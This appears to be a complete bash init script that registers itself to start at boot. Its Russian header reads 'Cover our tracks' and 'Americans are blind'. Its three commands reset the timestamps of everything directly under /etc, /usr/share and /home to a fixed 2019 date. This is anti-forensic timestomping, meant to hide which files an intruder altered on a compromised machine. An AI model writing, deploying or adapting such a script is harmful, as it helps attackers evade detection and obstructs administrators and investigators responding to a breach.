#!/bin/bash

### BEGIN INIT INFO
# Provides:          ts.sh
# Required-Start:    $remote_fs
# Required-Stop:     $remote_fs
# Should-Start:      $network $syslog
# Should-Stop:       $network $syslog
# Default-Start:     5
# Default-Stop:      0 1 2 3 4 6
# Short-Description: Прикрой наши треки
# Description:       американцы слепы
### END INIT INFO

touch --date="2019-12-20 04:20:00" /etc/*
touch --date="2019-12-20 04:20:00" /usr/share/*
touch --date="2019-12-20 04:20:00" /home/*